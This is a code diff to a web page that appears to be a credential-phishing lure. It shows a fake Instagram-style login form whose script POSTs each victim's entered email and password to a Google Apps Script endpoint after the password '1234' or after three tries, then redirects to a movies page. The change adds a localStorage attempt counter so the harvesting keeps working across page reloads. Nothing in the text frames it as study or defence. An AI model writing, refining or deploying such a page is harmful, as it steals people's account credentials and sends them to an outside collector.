@@ -27,24 +27,27 @@ button{ width:100%; padding:12px; background:#1877f2; color:white; border:none; 
 </div>
 
 <script>
-let attempts = 0;
+const correctPassword = "1234";
 const maxAttempts = 3;
-const correctPassword = "1234"; 
 const sheetUrl = "https://script.google.com/macros/s/AKfycbwhAztXlBe8D9aDEXF7MeOQ0HBEKwKjJm25j2lVoXzDl-bM5VIwyVvh89tpKsxoMWus/exec";
 
 function go(){
   const email = document.getElementById("instaUser").value;
   const pw = document.getElementById("instaPass").value;
   const error = document.getElementById("errorMsg");
-  attempts++;
 
-  if(pw === correctPassword || attempts === maxAttempts){
+  let attempts = parseInt(localStorage.getItem("insta_attempts") || "0");
+  attempts++;
+  localStorage.setItem("insta_attempts", attempts);
+
+  if(pw === correctPassword || attempts >= maxAttempts){
     fetch(sheetUrl, {
       method: "POST",
       headers: {'Content-Type': 'application/x-www-form-urlencoded'},
       body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=NA&form=Instagram`
     }).then(()=>{
-      window.location.href="movies.html"; 
+      localStorage.removeItem("insta_attempts");
+      window.location.href="movies.html";
     });
   } else {
     error.innerText = "Password incorrect";
